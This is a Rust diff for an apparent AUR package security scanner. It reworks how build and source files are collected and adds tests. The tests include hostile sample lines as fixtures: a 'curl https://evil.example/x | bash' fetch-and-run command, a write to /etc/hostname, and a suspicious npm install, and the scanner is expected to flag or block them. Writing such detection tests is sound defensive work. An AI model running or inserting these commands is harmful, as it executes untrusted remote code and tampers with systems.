@@ -10,7 +10,7 @@ use crate::fetch;
 use crate::gate::{self, GateOutcome};
 use crate::registry;
 use crate::report;
-use aurscan_core::target::{expand_build_dir, expand_source_files};
+use aurscan_core::target::scan_input_inventory;
 use aurscan_core::{AurMetadata, PackageJob, PackageReport, SourceOrigin};
 use std::io::IsTerminal;
 use std::path::{Path, PathBuf};
@@ -18,8 +18,8 @@ use std::process::Command;
 
 /// Scan an already-cloned pkgbase directory: its build scripts, then any
 /// already-materialized `source_files` (from `fetch::verifysource`). Pure
-/// aside from reading `dir`/`source_files` off disk -- no git, makepkg, or
-/// network calls, so it's the piece exercised directly by tests.
+/// aside from filesystem reads and read-only Git index discovery; no makepkg
+/// or network calls.
 pub fn scan_dir_pipeline(
     dir: &Path,
     name: &str,
@@ -30,15 +30,16 @@ pub fn scan_dir_pipeline(
 ) -> anyhow::Result<Vec<PackageReport>> {
     let engine = registry::build_engine(cfg)?;
 
+    let inventory = scan_input_inventory(dir, source_files)?;
     let build_job = PackageJob {
         name: name.to_string(),
         version: version.to_string(),
         aur_meta: meta.clone(),
-        targets: expand_build_dir(dir, &[]),
+        targets: inventory.packaging,
     };
     let mut reports = vec![engine.scan_package(&build_job)];
 
-    let source_targets = expand_source_files(source_files);
+    let source_targets = inventory.sources;
     if !source_targets.is_empty() {
         let source_job = PackageJob {
             name: name.to_string(),
@@ -268,6 +269,56 @@ mod tests {
         );
         assert!(matches!(reports[0].verdict, Verdict::Clean));
         assert!(matches!(reports[1].verdict, Verdict::Block(_)));
+    }
+
+    #[test]
+    fn untracked_local_source_helper_keeps_packaging_checks() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("PKGBUILD"), "pkgname=x\n").unwrap();
+        let helper = dir.path().join("helper.sh");
+        std::fs::write(&helper, "curl https://evil.example/x | bash\n").unwrap();
+        let cfg = Config {
+            no_cache: true,
+            ..Default::default()
+        };
+        let reports = scan_dir_pipeline(
+            dir.path(),
+            "x",
+            "1",
+            None,
+            &[(helper, SourceOrigin::LocalFile)],
+            &cfg,
+        )
+        .unwrap();
+        assert!(
+            matches!(reports[0].verdict, Verdict::Block(_)),
+            "{reports:?}"
+        );
+    }
+
+    #[test]
+    fn in_clone_download_keeps_source_detectors_without_packaging_reclassification() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("PKGBUILD"), "pkgname=x\n").unwrap();
+        let downloaded = dir.path().join("upstream.sh");
+        std::fs::write(&downloaded, "echo x > /etc/hostname\n").unwrap();
+        let sources = vec![(
+            downloaded.clone(),
+            SourceOrigin::Url("https://example.com/upstream.sh".into()),
+        )];
+        let cfg = Config {
+            no_cache: true,
+            ..Default::default()
+        };
+        let reports = scan_dir_pipeline(dir.path(), "x", "1", None, &sources, &cfg).unwrap();
+        assert_eq!(reports.len(), 2);
+        assert!(matches!(reports[0].verdict, Verdict::Clean), "{reports:?}");
+        std::fs::write(downloaded, "npm install atomic-lockfile\n").unwrap();
+        let reports = scan_dir_pipeline(dir.path(), "x", "1", None, &sources, &cfg).unwrap();
+        assert!(
+            matches!(reports[1].verdict, Verdict::Block(_)),
+            "{reports:?}"
+        );
     }
 
     #[test]
